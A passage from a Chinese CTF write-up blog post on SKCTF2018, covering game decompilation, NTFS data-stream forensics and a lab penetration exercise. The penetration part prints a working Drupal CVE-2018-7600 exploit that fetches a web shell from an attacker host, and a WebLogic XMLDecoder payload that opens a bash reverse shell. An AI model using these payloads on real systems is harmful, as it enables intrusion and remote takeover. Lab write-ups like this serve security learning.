+<h3 id="3-反编译"><a href="#3-反编译" class="headerlink" title="3-反编译"></a>3-反编译</h3><p>下载GameMarker 8.0 Decompiler，将exe进行反编译。得到工程文件gmk，下载一个GameMarker 8.0版本即可读取到所有资源，找到通关后场景就可以得到flag。</p>
+<h2 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h2><p>vmdk文件其实是物理硬盘的虚拟版，也存在着跟物理硬盘的分区和扇区中类似的填充区域。我们可以利用VMware直接映射虚拟磁盘。</p>
+<p><img src="http://ww1.sinaimg.cn/large/b12bdb25ly1fr1vzza21uj20r40b20xy.jpg"></p>
+<p><img src="http://ww1.sinaimg.cn/large/b12bdb25ly1fr1w09pixoj20pf0ctwgm.jpg"></p>
+<p>磁盘空间内只有一个nothing.rar，解压后得到nothing.gif，为NTFS数据流隐写。<strong>所以压缩包需要使用WinRAR进行解压。</strong></p>
+<p>用lads.exe递归查询可看到flag.gif</p>
+<p><img src="http://ww1.sinaimg.cn/large/b12bdb25ly1fr1w1mxxr4j20oy09h0t5.jpg"></p>
+<p>使用Ntfs Streams Editor提取</p>
+<p><img src="http://ww1.sinaimg.cn/large/b12bdb25ly1fr1w1uxzrjj20vw0dl0ws.jpg"></p>
+<p>对gif图分帧处理，得到最终flag。</p>
+<p><img src="http://ww1.sinaimg.cn/large/b12bdb25ly1fr1w2eagy8j21a90510sz.jpg"></p>
+<p>详细解析及原理见</p>
+<p><a href="0sec.com.cn/2018-05-12/">0sec.com.cn/2018-05-12/</a></p>
+<h1 id="靶场渗透"><a href="#靶场渗透" class="headerlink" title="靶场渗透"></a>靶场渗透</h1><p>网上搜下drupal的的漏洞，找到poc</p>
+<pre><code>#!/usr/bin/env python3
+import sys
+import requests
+
+print (&#39;################################################################&#39;)
+print (&#39;# Proof-Of-Concept for CVE-2018-7600&#39;)
+print (&#39;# by Vitalii Rudnykh&#39;)
+print (&#39;# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders&#39;)
+print (&#39;# https://github.com/a2u/CVE-2018-7600&#39;)
+print (&#39;################################################################&#39;)
+print (&#39;Provided only for educational or information purposes\n&#39;)
+
+
+# Add proxy support (eg. BURP to analyze HTTP(s) traffic)
+# set verify = False if your proxy certificate is self signed
+# remember to set proxies both for http and https
+# 
+# example:
+# proxies = &#123;&#39;http&#39;: &#39;http://127.0.0.1:8080&#39;, &#39;https&#39;: &#39;http://127.0.0.1:8080&#39;&#125;
+# verify = False
+proxies = &#123;&#125;
+verify = True
+
+target = &#39;http://192.168.211.105/&#39;
+url = target + &#39;user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax&#39; 
+payload = &#123;&#39;form_id&#39;: &#39;user_register_form&#39;, &#39;_drupal_ajax&#39;: &#39;1&#39;, &#39;mail[#post_render][]&#39;: &#39;exec&#39;, &#39;mail[#type]&#39;: &#39;markup&#39;, &#39;mail[#markup]&#39;: &#39;curl http://192.168.211.127:2333/shell.php| tee shell.php&#39;&#125;
+
+r = requests.post(url, proxies=proxies, data=payload, verify=verify)
+check = requests.get(target + &#39;shell.php&#39;, verify=verify)
+if check.status_code != 200:
+  sys.exit(&quot;Not exploitable&quot;)
+print (&#39;\nCheck: &#39;+target+&#39;hello.txt&#39;)</code></pre>
+<p>本地起个环境，利用curl来getshell</p>
+<p>拿到shell利用msf丢个马上去 </p>
+<p><img src="/images/SKCTF2018/bachang1.png"></p>
+<p>扫一波发现了<code>10.0.0.3</code>开着7001端口，weblogic</p>
+<p>网上找下poc</p>
+<pre><code>#encoding: utf-8
+import requests
+headers = &#123; &#39;Content-type&#39;: &#39;text/xml&#39; &#125;
+data = &#39;&#39;&#39;
+&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+  &lt;soapenv:Header&gt;
+&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
+&lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
+  &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;
+&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;
+  &lt;void index=&quot;0&quot;&gt;
+&lt;string&gt;bash&lt;/string&gt;
+  &lt;/void&gt;
+  &lt;void index=&quot;1&quot;&gt;
+&lt;string&gt;-c&lt;/string&gt;
+  &lt;/void&gt;
+  &lt;void index=&quot;2&quot;&gt;
+&lt;string&gt;bash -i &gt;&amp;amp; /dev/tcp/192.168.211.149/12222 0&gt;&amp;amp;1&lt;/string&gt;
+  &lt;/void&gt;
+&lt;/array&gt;
+  &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;
+&lt;/java&gt;
+  &lt;/work:WorkContext&gt;
+&lt;/soapenv:Header&gt;
+  &lt;soapenv:Body/&gt;
+&lt;/soapenv:Envelope&gt;&#39;&#39;&#39;
+def exp(ip):
+    print(&quot;Test for &quot; + ip + &quot; .....&quot;)
+    r = requests.post(url=ip,data=data,headers=headers)
+    print(r.status_code)
+    print(r.text)
+
+if __name__ == &#39;__main__&#39;:
+    ip = &quot;http://10.0.0.3:7001/wls-wsat/CoordinatorPortType11&quot;
+    exp(ip)</code></pre>
+<p>修改下proxychains.conf加上代理，本地监听一下拿到shell</p>
+<p><img src="/images/SKCTF2018/bachang2.png"></p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">LANVNAL</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://lanvnal.com/2018/05/07/skctf2018-writeup/">https://lanvnal.com/2018/05/07/skctf2018-writeup/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">LANVNAL</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/WriteUp/">
+                                    <span class="chip bg-color">WriteUp</span>
+                                </a>
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,qq,wechat,weibo" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2018/05/17/ddctf-de-bu-fen-writeup/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/coverimgs/4.png" class="responsive-img" alt="DDCTF的部分WriteUp">
+                        
+                        <span class="card-title">DDCTF的部分WriteUp</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+因为筹备校赛当时写了一半的wp拖了快一个月才写完，今天发现DDCTF的平台和题目竟然还开着(⊙v⊙)，很良心啊，当时也没有怎么去做题，水了几个misc，web涨姿势了，好菜_(:з」∠)_
+
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2018-05-17
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/WriteUp/">
+                        <span class="chip bg-color">WriteUp</span>
+                    </a>
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2018/04/29/ciscn2018-wp/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/coverimgs/1.jpg" class="responsive-img" alt="CISCN2018 WriteUp">
+                        
+                        <span class="card-title">CISCN2018 WriteUp</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            From 一个更响亮的队名
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2018-04-29
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/WriteUp/">
+                        <span class="chip bg-color">WriteUp</span>
+                    </a>
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2017</span>
+            <a href="/about" target="_blank">LANVNAL</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">120.6k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2017";
+                    var startMonth = "3";
+                    var startDate = "15";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/LANVNAL" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:lanvnal@foxmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
